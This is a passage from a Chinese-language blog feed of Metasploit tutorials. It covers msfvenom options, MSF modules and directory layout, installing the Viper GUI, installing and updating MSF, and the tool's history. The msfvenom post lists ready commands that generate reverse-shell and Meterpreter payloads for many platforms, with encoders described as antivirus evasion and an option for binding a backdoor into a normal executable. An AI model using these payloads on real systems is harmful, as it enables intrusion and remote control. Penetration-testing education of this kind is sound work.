            "content_html": "<p>Kali 中的 msfvenom 取代了 msfpayload 和 msfencode，常用于生成后门木马</p>\n<p>msfpayload 是 MSF 攻击荷载生成器，用于生成 shellcode 和可执行代码。<br>\nmsfencode 是 MSF 编码器。</p>\n<hr>\n<p>一 、msfvenom 常用参数</p>\n<p>-l<br>\n 列出指定模块的所有可用资源，模块类型包括: payloads, encoders, nops, all</p>\n<p>-p<br>\n 指定需要使用的 payload (攻击荷载)。</p>\n<p>-f<br>\n 指定输出格式</p>\n<p>Executable formats:Asp、aspx、aspx-exe、axis2、dll、elf、elf-so、exe、exe-only、exe-service、exe-smallhta-psh、jar、jsp、loop-vbs、macho、msi、msi-nouac、osx-app、psh、psh-cmd、psh-net、psh-reflection、python-reflection、vba、vba-exe、vba-psh、vbs、war；</p>\n<p>Transform formats:base32、base64、bash、c、csharp、dw、dword、hex、java、js_be、js_le、num、perl、pl、powershell、ps1、py、python、raw、rb、ruby、sh、vbapplication、vbscript；</p>\n<p>-e<br>\n 指定需要使用的 encoder（编码器）编码免杀。</p>\n<p>-a<br>\n 指定 payload 的目标架构</p>\n<p>选择架构平台:x86 | x64 | x86_64<br>\nPlatforms:windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe</p>\n<p>-o<br>\n 保存 payload 文件输出。</p>\n<p>-b<br>\n 设定规避字符集，比如: '\\x00\\xff' 避免使用的字符</p>\n<p>-n<br>\n 为 payload 预先指定一个 NOP 滑动长度</p>\n<p>-s<br>\n 设定有效攻击荷载的最大长度生成 payload 的最大长度，就是文件大小。</p>\n<p>-i<br>\n 指定 payload 的编码次数</p>\n<p>-c<br>\n 指定一个附加的 win32 shellcode 文件</p>\n<p>-x<br>\n 指定一个自定义的可执行文件作为模板<br>\n例如：原先有个正常文件 normal.exe 可以通过这个选项把后门捆绑到这个程序上面。</p>\n<p>-k<br>\n 保护模板程序的动作，注入的 payload 作为一个新的进程运行<br>\n例如：原先有个正常文件 normal.exe 可以通过这个选项把后门捆绑到这个程序上面。</p>\n<p>-v<br>\n 指定一个自定义的变量，以确定输出格式</p>\n<hr>\n<p>二、各平台生成 payload 命令</p>\n<hr>\n<p>Windows</p>\n<p>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp</p>\n<p>LHOST=192.168.3.33 LPORT=4444 -e x86/shikata_ga_nai -b '\\x00\\x0a\\xff' -i 10  -f exe -o payload.exe</p>\n<hr>\n<p>Mac</p>\n<p>msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.3.33 LPORT=4444 -f macho -o payload.macho</p>\n<hr>\n<p>Android</p>\n<p>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567  -o payload.apk</p>\n<hr>\n<p>Powershell</p>\n<p>msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=192.168.1.1 LPORT=8888 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1</p>\n<hr>\n<p>Linux</p>\n<p>msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f elf -o payload.elf</p>\n<hr>\n<p>php</p>\n<p>msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.1  LPORT=8888  -f raw &gt; shell.php</p>\n<hr>\n<p>aspx</p>\n<p>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=8888 -f aspx -o payload.aspx</p>\n<hr>\n<p>JSP</p>\n<p>msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1  LPORT=4567 -f raw -o payload.jsp</p>\n<hr>\n<p>war</p>\n<p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw - o payload.war</p>\n<hr>\n<p>nodejs</p>\n<p>msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.1.1  LPORT=4567 -f raw -o payload.js</p>\n<hr>\n<p>python</p>\n<p>msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.1  LPORT=4567 -f raw -o <span class=\"exturl\" data-url=\"aHR0cDovL3BheWxvYWQucHk=\">payload.py</span></p>\n<hr>\n<p>perl</p>\n<p>msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.1  LPORT=4567 -f raw -o <span class=\"exturl\" data-url=\"aHR0cDovL3BheWxvYWQucGw=\">payload.pl</span></p>\n<hr>\n<p>ruby</p>\n<p>msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.rb</p>\n<hr>\n<p>lua</p>\n<p>msfvenom -p cmd/unix/reverse_lua LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.lua</p>\n<hr>\n<p>windows shellcode</p>\n<p>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f c</p>\n<hr>\n<p>linux shellcode</p>\n<p>msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f c</p>\n<hr>\n<p>mac shellcode</p>\n<p>msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp  LHOST=192.168.1.1  LPORT=4567 -f c</p>\n<hr>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/MSF%E7%9A%84%E6%A0%B8%E5%BF%83%E6%A8%A1%E5%9D%97modules/",
            "url": "https://mangpumo.github.io/2023/01/12/MSF%E7%9A%84%E6%A0%B8%E5%BF%83%E6%A8%A1%E5%9D%97modules/",
            "title": "MSF的核心模块modules",
            "date_published": "2023-01-11T19:33:25.000Z",
            "content_html": "<p>msf 的模块都放在</p>\n<p>/usr/share/metasploit-framework/modules/ 这个目录下</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1640748958000/9e03e3c4dbc548d7b38c0389b1f131ab.png\" alt=\"image.png\"></p>\n<p>1 auxiliary: 辅助模块，辅助渗透 (端口扫描、登录密码爆破、漏洞验证等)</p>\n<p>2 exploits: 漏洞利用模块，包含主流的漏洞利用脚本，通常是对某些可能存在漏洞的目标进行漏洞利用。</p>\n<p>3 payloads: 攻击载荷，主要是攻击成功后在目标机器执行的代码，比如反弹 shell 的代码</p>\n<p>4 post: 后渗透阶段模块，漏洞利用成功获得 meterpreter 之后， 向目标发送的一些功能性</p>\n<p>指令，如：提权等</p>\n<p>5 encoders: 编码器模块，主要包含各种编码工具，对 payload 进行编码加密，以便绕过入侵检测和过滤系统</p>\n<p>6 evasion: 躲避模块，用来生成免杀 payload</p>\n<p>7 nops: 这里主要放着调整 shellcode 前置 nop 指令长度的工具（不理解没关系）</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/MSF%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/",
            "url": "https://mangpumo.github.io/2023/01/12/MSF%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/",
            "title": "MSF目录结构",
            "date_published": "2023-01-11T19:30:47.000Z",
            "content_html": "<h1 id=\"msf目录结构\"><a class=\"anchor\" href=\"#msf目录结构\">#</a> MSF 目录结构</h1>\n<p>kali 终端中输</p>\n<p>/usr/share/metasploit-framework</p>\n<p>然后输入 ls 查看</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639971401000/1abfa994573e4ec1b283aea5ecb809d3.png\" alt=\"image.png\"></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639971401000/13fa9f11a9b540f7a15854b67186ae99.png\" alt=\"image.png\"></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639971401000/15e181b7c7534f549cbbcb249121acb5.png\" alt=\"image.png\"></p>\n<h1 id=\"要记住的一些模块\"><a class=\"anchor\" href=\"#要记住的一些模块\">#</a> 要记住的一些模块</h1>\n<p>modules：目录里面存放渗透使用的  辅助模块  编码模块  利用模块  攻击载荷   后渗透模块</p>\n<p>plugins： 这个模块需要用 load 加载，主要提供数据库连接插件 和 各种要用到的插件。</p>\n<p>tools：包含一些有用的脚本和零散的工具。</p>\n<p>scripts：目录里面存放都是 meterpreter 利用的脚本。</p>\n<p>db：数据放在这个目录里</p>\n<p>data：存放使用到的文件，比如密码字典、meterpreter、passivex、vnc、dlls 等工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件</p>\n<p>lib：库文件都保存在这个目录里</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper/",
            "url": "https://mangpumo.github.io/2023/01/12/MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper/",
            "title": "MSF图形界面Viper",
            "date_published": "2023-01-11T18:57:39.000Z",
            "content_html": "<p><strong>MSF 图形化界面 Viper (炫彩蛇) 下载与使用</strong></p>\n<p>Viper 是一款图形化内网渗透工具，将内网渗透过程中常用的战术及技术进行模块化及武器化.</p>\n<p>集成杀软绕过，内网隧道，文件管理，命令行等基础功能.</p>\n<p>当前已集成 70 + 个模块，覆盖初始访问 / 持久化 / 权限提升 / 防御绕过 / 凭证访问 / 信息收集 / 横向移动等大类.</p>\n<p><strong>在 Kali Linux 上安装 Docker</strong></p>\n<p>apt-get update</p>\n<p>#使用 apt 安装 docker</p>\n<p>apt-get install -y <span class=\"exturl\" data-url=\"aHR0cDovL2RvY2tlci5pbw==\">docker.io</span></p>\n<p>#设置开机启动 systemctl start docker</p>\n<p>#检查启动状态 docker version</p>\n<p><img data-src=\"MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043246556.png\" alt=\"1640043246556\"></p>\n<p><strong>安装 docker-compose</strong></p>\n<p>curl -L <span class=\"exturl\" data-url=\"aHR0cHM6Ly9nZXQuZGFvY2xvdWQuaW8vZG9ja2VyL2NvbXBvc2UvcmVsZWFzZXMvZG93bmxvYWQvMS4yNS41L2RvY2tlci1jb21wb3NlLQ==\">https://get.daocloud.io/docker/compose/releases/download/1.25.5/docker-compose-</span> <code>uname -s</code> - <code>uname -m</code>  &gt; /usr/bin/docker-compose</p>\n<p>#给赋可执行状态 chmod +x /usr/bin/docker-compose</p>\n<p><img data-src=\"MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043297604.png\" alt=\"1640043297604\"></p>\n<p>#设置安装目录</p>\n<p>export VIPER_DIR=/root/VIPER</p>\n<p>#执行如下命名生成安装目录，并进入安装目录</p>\n<p>mkdir -p $VIPER_DIR &amp;&amp; cd $VIPER_DIR</p>\n<p><img data-src=\"MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043341743.png\" alt=\"1640043341743\"></p>\n<p><strong>执行如下命令生成 docker-compose.yml</strong></p>\n<p>如果你看到的命令是乱的  <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLnlvdWRhby5jb20vcy9HZHpTSm5XRA==\">https://note.youdao.com/s/GdzSJnWD</span>  看这个文档</p>\n<p>tee docker-compose.yml &lt;&lt;-'EOF' version: &quot;3&quot; services:  viper:    image: <span class=\"exturl\" data-url=\"aHR0cDovL3JlZ2lzdHJ5LmNuLXNoZW56aGVuLmFsaXl1bmNzLmNvbS90b3lzL3ZpcGVyOmxhdGVzdA==\">registry.cn-shenzhen.aliyuncs.com/toys/viper:latest</span>    container_name: viper-c    network_mode: &quot;host&quot;    restart: always    volumes:      - ${PWD}/loot:/root/.msf4/loot      - ${PWD}/db:/root/viper/Docker/db      - ${PWD}/module:/root/viper/Docker/module      - ${PWD}/log:/root/viper/Docker/log      - ${PWD}/nginxconfig:/root/viper/Docker/nginxconfig    command: [&quot;VIPER_PASSWORD&quot;] EOF</p>\n<p><img data-src=\"MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043385926.png\" alt=\"1640043385926\"></p>\n<p><strong>设置登录密码</strong></p>\n<p>Viper 不允许使用默认密码，diypassword 替换为自定义密码密码</p>\n<p>export VIPER_PASSWORD = 输入你的密码</p>\n<p><img data-src=\"MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043439186.png\" alt=\"1640043439186\"></p>\n<p><strong>写入密码到 docker-compose.yml</strong></p>\n<p>sed -i &quot;s/VIPER_PASSWORD/$VIPER_PASSWORD/g&quot; docker-compose.yml</p>\n<p>#使用命令查看一下配置</p>\n<p>cat docker-compose.yml</p>\n<p><img data-src=\"MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043478861.png\" alt=\"1640043478861\"></p>\n<p><strong>创建启动 Viper</strong></p>\n<p>cd $VIPER_DIR docker-compose up -d</p>\n<p>启动 viper</p>\n<p>docker-compose start</p>\n<p><img data-src=\"MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043509764.png\" alt=\"1640043509764\"></p>\n<p><strong>等待 15s 系统启动，访问</strong></p>\n<ul>\n<li><strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pcDo2MDAwMA==\">https://ip:60000</span></strong></li>\n<li>登录。用户名:root 密码：自定义密码</li>\n</ul>\n<p>在终端内输入  ip a 查看本机 ip</p>\n<ul>\n<li><strong>我的 IP 是 192.168.3.31  那么我在浏览器里就访问  <span class=\"exturl\" data-url=\"aHR0cHM6Ly8xOTIuMTY4LjMuMzE6NjAwMDA=\">https://192.168.3.31:60000</span>  登录名是  root  密码是  我上面设置的 root</strong></li>\n</ul>\n<p><img data-src=\"MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043540568.png\" alt=\"1640043540568\"></p>\n<p>例如： 我的 ip 是 192.168.3.31  那么访问炫彩蛇的 IP 就是 192.168.3.31:60000</p>\n<p><strong>注意：</strong></p>\n<p><strong>所有的 docker-compose 命令必须在安装目录执行才会有效果</strong></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/WINDOWS%E5%AE%89%E8%A3%85MSF/",
            "url": "https://mangpumo.github.io/2023/01/12/WINDOWS%E5%AE%89%E8%A3%85MSF/",
            "title": "WINDOWS安装MSF",
            "date_published": "2023-01-11T18:35:20.000Z",
            "content_html": "<h1 id=\"1-下载metasploit\"><a class=\"anchor\" href=\"#1-下载metasploit\">#</a> 1  下载 metasploit</h1>\n<p>首先咱们进入 metasploit 官网</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWV0YXNwbG9pdC5jb20v\">https://www.metasploit.com/</span></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970354000/de0dfa24cf144e319e9817208d796e67.png\" alt=\"image.png\"></p>\n<p>点击 Download  下载</p>\n<p>或者直接访问这个 地址</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWV0YXNwbG9pdC5jb20vZG93bmxvYWQ=\">https://www.metasploit.com/download</span></p>\n<p>进入这个页面  点击 Metasploit Framework  下面的 Download</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970354000/40c70142eedd4ee7b6a132a84426dd1f.png\" alt=\"image.png\"></p>\n<p>会访问这个地址</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JhcGlkNy9tZXRhc3Bsb2l0LWZyYW1ld29yay93aWtpL05pZ2h0bHktSW5zdGFsbGVycw==\">https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers</span></p>\n<p>如果你不能打开 GitHub 我们可以通过镜像服务器 访问</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9odWIuZmFzdGdpdC5vcmcvcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrL3dpa2kvTmlnaHRseS1JbnN0YWxsZXJz\">https://hub.fastgit.org/rapid7/metasploit-framework/wiki/Nightly-Installers</span></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970354000/a6096a53fc0f411fa7d4a1ecb32bea1a.png\" alt=\"image.png\"></p>\n<p>这边给大家提供更多的国内可用镜像</p>\n<p>#官网镜像（可以用来 clone push 等，但是不能登录）</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tLmNucG1qcy5vcmcv\">https://github.com.cnpmjs.org/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXQuc2R1dC5tZS8=\">https://git.sdut.me/</span></p>\n<p>#github 常用的镜像</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9odWIuZmFzdGdpdC5vcmc=\">https://hub.fastgit.org</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXQuc2R1dC5tZS8=\">https://git.sdut.me/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2dpdGh1Yi1taXJyb3IuYnVna2lsbGVyLm9yZy8=\">http://github-mirror.bugkiller.org/</span><br>\n#api 镜像<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcGkuZ2l0LnNkdXQubWUv\"> https://api.git.sdut.me/</span></p>\n<p>然后找到 Windows 版本的下载</p>\n<p>点击 latest Windows installer 下载  最新版本</p>\n<p>点击  view older builds   下载历史版本</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970354000/cd3b851b93854b55b549028fa9fb61f9.png\" alt=\"image.png\"></p>\n<h1 id=\"2-安装metasploit并配置环境变量\"><a class=\"anchor\" href=\"#2-安装metasploit并配置环境变量\">#</a> 2 安装 metasploit 并配置环境变量</h1>\n<p>安装前关闭 win 自带的杀毒 和卸载第三方杀毒</p>\n<p>添加环境变量</p>\n<p>C:\\metasploit-framework\\bin</p>\n<h1 id=\"3-启动并使用\"><a class=\"anchor\" href=\"#3-启动并使用\">#</a> 3 启动并使用</h1>\n<p>首次启动 需要初始化数据库</p>\n<p>终端中输入 msfdb init</p>\n<p>启动 MSF 框架</p>\n<p>终端中输入 msfconsole</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/KALI%E6%9B%B4%E6%96%B0MSF/",
            "url": "https://mangpumo.github.io/2023/01/12/KALI%E6%9B%B4%E6%96%B0MSF/",
            "title": "KALI更新MSF",
            "date_published": "2023-01-11T18:30:56.000Z",
            "content_html": "<p>登录 kali</p>\n<h1 id=\"1-打开终端获取root权限\"><a class=\"anchor\" href=\"#1-打开终端获取root权限\">#</a> 1 打开终端获取 root 权限</h1>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">获取root权限 可以在终端 输入 sudo su  然后输入登录密码获取root权限</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"2-开始更新\"><a class=\"anchor\" href=\"#2-开始更新\">#</a> 2 开始更新</h1>\n<p>首先先添加更新源</p>\n<p>进入 etc/apt/   目录</p>\n<p>打开 sources.list   需要使用 root 权限执行</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970340000/777269e6dc9143718ac9080d4650d0c7.png\" alt=\"image.png\"></p>\n<p>deb <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMudXN0Yy5lZHUuY24va2FsaQ==\">http://mirrors.ustc.edu.cn/kali</span> kali-rolling main non-free contrib</p>\n<p>deb-src <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMudXN0Yy5lZHUuY24va2FsaQ==\">http://mirrors.ustc.edu.cn/kali</span> kali-rolling main non-free contrib</p>\n<p>#阿里云 kali 更新源</p>\n<p>deb <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS9rYWxp\">http://mirrors.aliyun.com/kali</span> kali-rolling main non-free contrib</p>\n<p>deb-src <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS9rYWxp\">http://mirrors.aliyun.com/kali</span> kali-rolling main non-free contrib</p>\n<p>#163 DEBIAN 源</p>\n<p>deb <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuMTYzLmNvbS9kZWJpYW4=\">http://mirrors.163.com/debian</span> wheezy main non-free contrib</p>\n<p>deb-src <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuMTYzLmNvbS9kZWJpYW4=\">http://mirrors.163.com/debian</span> wheezy main non-free contrib deb <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuMTYzLmNvbS9kZWJpYW4=\">http://mirrors.163.com/debian</span> wheezy-proposed-updates main non-free contrib</p>\n<p>deb-src <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuMTYzLmNvbS9kZWJpYW4=\">http://mirrors.163.com/debian</span> wheezy-proposed-updates main non-free contrib</p>\n<p>deb-src <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuMTYzLmNvbS9kZWJpYW4tc2VjdXJpdHk=\">http://mirrors.163.com/debian-security</span> wheezy/updates main non-free contrib</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970340000/c9eeca42087541a09f20a8078d8064c7.png\" alt=\"image.png\"></p>\n<p>​                apt-get update</p>\n<p>​                apt-get  install metasploit-framework</p>\n<h1 id=\"3-如果更新时显示update无效的错误\"><a class=\"anchor\" href=\"#3-如果更新时显示update无效的错误\">#</a> 3 如果更新时显示 update 无效的错误！</h1>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970340000/dea81b359ad14271b35fbc7db0609126.png\" alt=\"image.png\"></p>\n<p>输入下面几个命令修复</p>\n<p>wget -q -O - <span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcmNoaXZlLmthbGkub3JnL2FyY2hpdmUta2V5LmFzYw==\">https://archive.kali.org/archive-key.asc</span> | apt-key add</p>\n<p>apt-get clean</p>\n<p>apt-get update</p>\n<p>4 如果报：E: Unmet dependencies. Try 'apt --fix-broken install' with no packages (or specify a solution).</p>\n<p>​                apt --fix-broken install</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/Linux%E5%AE%89%E8%A3%85MSF/",
            "url": "https://mangpumo.github.io/2023/01/12/Linux%E5%AE%89%E8%A3%85MSF/",
            "title": "Linux安装MSF",
            "date_published": "2023-01-11T18:29:36.000Z",
            "content_html": "<p><strong>1 乌班图安装 MSF</strong></p>\n<p><strong>环境准备：</strong></p>\n<p>vm 虚拟机</p>\n<p>Ubuntu 桌面版镜像</p>\n<p>打开终端  输入 sudo su  获取 root 权限</p>\n<p>然后输入命令</p>\n<p>curl <span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JhcGlkNy9tZXRhc3Bsb2l0LW9tbmlidXMvbWFzdGVyL2NvbmZpZy90ZW1wbGF0ZXMvbWV0YXNwbG9pdC1mcmFtZXdvcmstd3JhcHBlcnMvbXNmdXBkYXRlLmVyYg==\">https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb</span> &gt; msfinstall</p>\n<p>然后赋 755 权限 并执行安装</p>\n<p>chmod 755 msfinstall &amp;&amp; ./msfinstall</p>\n<p><strong>2 直接安装 kali 系统</strong></p>\n<p>第一种 vm 虚拟机 kali</p>\n<p>第二种 iso 安装镜像</p>\n<p>首先咱们进入 kali 官网下载 kali</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cua2FsaS5vcmcvZ2V0LWthbGkvI2thbGktYmFyZS1tZXRhbA==\">https://www.kali.org/get-kali/#kali-bare-metal</span>  选择安装版镜像</p>\n<p>![1639993881805](02 Linux 安装 msf.assets/1639993881805.png)</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/MSF%E5%8F%91%E5%B1%95%E5%8F%B2/",
            "url": "https://mangpumo.github.io/2023/01/12/MSF%E5%8F%91%E5%B1%95%E5%8F%B2/",
            "title": "MSF发展史",
            "date_published": "2023-01-11T18:28:13.000Z",
            "content_html": "<h1 id=\"1-metasploit-发展史\"><a class=\"anchor\" href=\"#1-metasploit-发展史\">#</a> 1 Metasploit - 发展史</h1>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639966573000/418450a2cc3143c2bb296f73eccb131d.png\" alt=\"image.png\"></p>\n<p>Metasploit 框架使 Metasploit 具有良好的可扩展性，它的控制接口负责发现漏洞、攻击漏洞，提交漏洞，然后通过一些接口加入攻击后处理工具和报表工具。Metasploit 框架可以从一个漏洞扫描程序导入数据，使用关于有漏洞主机的详细信息来发现可攻击漏洞，然后使用有效载荷对系统发起攻击，有效载荷就是在发现漏洞之后开发一种可行的攻击方法。其用于提取本地系统密码、安装其他软件或控制硬件等的模块，这些功能很像以前 BO2K 等工具所具备的功能。</p>\n<h2 id=\"2004年\"><a class=\"anchor\" href=\"#2004年\">#</a> 2004 年</h2>\n<p>2004 年 8 月，在拉斯维加斯开了一次世界黑客交流会 -- 叫黑帽简报（Black Hat Briefings). 在这个会议上，一款叫 Metasploit 的攻击和渗透工具备受众黑客关注，出尽了风头。 Metasploit 是同 HD Moore 和 Spoonm 等 4 名年轻人开发的，这款免费软件可以帮助黑客攻击和控制计算机，安全人员也可以利用 Metasploit 来加强系统对此类工具的攻击。Metasploit 的演示吸引了来自 “美国国防部” 和 “国家安全局” 等政府机构的众多安全顾问和个人，正如 Spoonm 在演讲中所说的，Metasploit 很简单，只需要求 “找到目标，单击和控制” 即可。 2004 年 Metasploit 的发布在安全界引发了强烈的 “地震”。</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639966573000/a3d942aff8ef42949af2523afdc7fb00.png\" alt=\"image.png\"></p>\n<h2 id=\"2005年\"><a class=\"anchor\" href=\"#2005年\">#</a> 2005 年</h2>\n<p>2005 年 6 月，西雅图效区的微软公司总部园区内的管理情报中心，开了一次 “蓝帽” 会议。几百名微软公司的工程师和众多外界专家及黑客都被邀请进入微软帝国的中心。在会议中的黑客攻击演示中，当 Moore 向系统程序员们说明使用 Metasploit 测试系统对抗入侵的可靠程度时，Metasploit 让微软公司的开发人员再次感到不安。在程序员们看来，Metasploit 将会使系统安全面临严重的考验。 Metasploit (MSF) 在 2003 年以开放源码方式发布，是可以自由获取的开发框架。它是一个强大的开源平台，提供开发，测试和使用恶意代码，这个环境为渗透测试，为 shellcode 编写和漏洞研究提供了一个可靠平台。 Metasploit 框架直到 2006 年发布的 2.7 版本都用 Perl 脚本语言编写，由于 Perl 的一些缺陷，开发者于 2007 年底使用 Ruby 语言重写了该框架。到 2007 年年底，Spoonm 和马特・米勒已经离开了项目。从 2008 年发布的 3.2 版本开始，该项目采用新的 3 段式 BSD 许可证。</p>\n<h2 id=\"2009年\"><a class=\"anchor\" href=\"#2009年\">#</a> 2009 年</h2>\n<p>2009 年 10 月 21 号，漏洞管理解决公司 Rapid7 收购 Metasploit 项目。Rapid7 承诺成立专职开发团队，仍然将源代码置于 3 段式 BSD 许可证下。</p>\n<h1 id=\"2-bsd许可证\"><a class=\"anchor\" href=\"#2-bsd许可证\">#</a> 2 BSD 许可证</h1>\n<p>相较于 GPL 许可证和 MPL 许可证的严格性，BSD 许可证就宽松许多了，一样是只需要附上许可证的原文，不过比较有趣的是，它还要求所有进一步开发者将自己的版权资料放上去，所以拿到以 BSD 许可证发行的软件可能会遇到一个小状况，就是这些版权资料许可证占的空间比程序还大。</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639966573000/9bc54e5da27644769e8c59836a95aa0c.png\" alt=\"image.png\"></p>\n<h1 id=\"3-metasploit发展前景\"><a class=\"anchor\" href=\"#3-metasploit发展前景\">#</a> 3 Metasploit 发展前景</h1>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639966573000/53ecab99591140878359777a3039a423.png\" alt=\"image.png\"></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/CPP%E5%B9%B6%E6%9F%A5%E9%9B%86/",
            "url": "https://mangpumo.github.io/2023/01/12/CPP%E5%B9%B6%E6%9F%A5%E9%9B%86/",
            "title": "CPP并查集",
            "date_published": "2023-01-11T16:44:42.000Z",
